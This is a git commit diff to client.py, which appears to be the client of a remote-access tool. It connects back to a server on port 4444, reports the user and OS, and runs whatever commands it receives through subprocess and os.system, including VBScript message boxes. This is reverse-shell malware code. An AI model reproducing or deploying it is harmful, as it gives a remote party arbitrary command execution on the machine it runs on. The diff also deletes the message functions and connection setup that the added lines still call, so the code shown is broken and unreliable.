994648e0372a2e320268c167f8a8564726e9b0a9
Colbster937 <96893162+colbychittenden@users.noreply.github.com>
2024-01-27 18:42:43 -0600

    init

--- client.py
+++ client.py
@@ -5,43 +5,8 @@ from socket import *
 import subprocess
 import platform
 
-def send_message(connection, message):
-    try:
-        message = message.encode()
-        message_length = len(message)
-        connection.sendall(str(message_length).zfill(10).encode())
-        connection.sendall(message)
-    except Exception as e:
-        print(f"Error sending message: {e}")
-        sys.exit()
-
-def receive_full_message(connection):
-    try:
-        message_length = int(connection.recv(10).decode())
-        data = b''
-        while len(data) < message_length:
-            packet = connection.recv(message_length - len(data))
-            if not packet:
-                return None
-            data += packet
-        return data.decode()
-    except ValueError:
-        return None
-
-get_os = platform.uname()[0]
-get_user = getuser()
-os_info = "Name: "+str(get_user)+" <-> "+"OS: "+str(get_os)
-
-ip = "127.0.0.1"
-port = 4444
-
-connection = socket(AF_INET, SOCK_STREAM)
-connection.connect((ip, port))
-
-current_directory = os.getcwd()
-
-send_message(connection, os_info)
-send_message(connection, f"DIR:{current_directory}")
+def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
+send_message(connection, f"{current_directory}")
 
 while True:
     try:
@@ -50,7 +15,7 @@ while True:
             print("Connection closed by the server")
             break
 
-        if receiver in ["exit", "quit", 'q']:
+        if receiver in ["exit", "quit", "q"]:
             sys.exit()
         elif receiver[:2] == "cd":
             os.chdir(receiver[3:])
@@ -58,7 +23,13 @@ while True:
             send_message(connection, f"DIR:{current_directory}")
         elif receiver == "getcwd":
             current_directory = os.getcwd()
-            send_message(connection, f"DIR:{current_directory}")
+            send_message(connection, f"{current_directory}")
+        elif receiver == "getinfo":
+            send_message(connection, os_info)
+        elif receiver == "generic_no_input":
+            send_message(connection, "Please type a command")
+        elif receiver in ["clear", "cls"]:
+            send_message(connection, f"{current_directory}")
         elif receiver.startswith("msgbox"):
             try:
                 _, msg, title = receiver.split('"')
@@ -66,15 +37,15 @@ while True:
                 os.system(vbscript_command)
                 send_message(connection, "MessageBox displayed")
             except Exception as e:
-                send_message(connection, f"Error: {str(e)}" + '\nExample usage: msgbox "test"')
+                send_message(connection, f"Error: {str(e)}" + '\nExample usage: msgbox "testMessage" testTitle')
         else:
             try:
                 output = subprocess.getoutput(receiver)
                 current_directory = os.getcwd()
-                send_message(connection, f"DIR:{current_directory}\n{output}" if output else f"DIR:{current_directory}\nNo output")
+                send_message(connection, f"{output}" if output else f"{current_directory}\nNo output")
             except Exception as e:
                 current_directory = os.getcwd()
-                send_message(connection, f"DIR:{current_directory}\nCommand execution error: {e}")
+                send_message(connection, f"Command execution error: {e}")
     except Exception as e:
         print(f"Error receiving data: {e}")
         sys.exit()
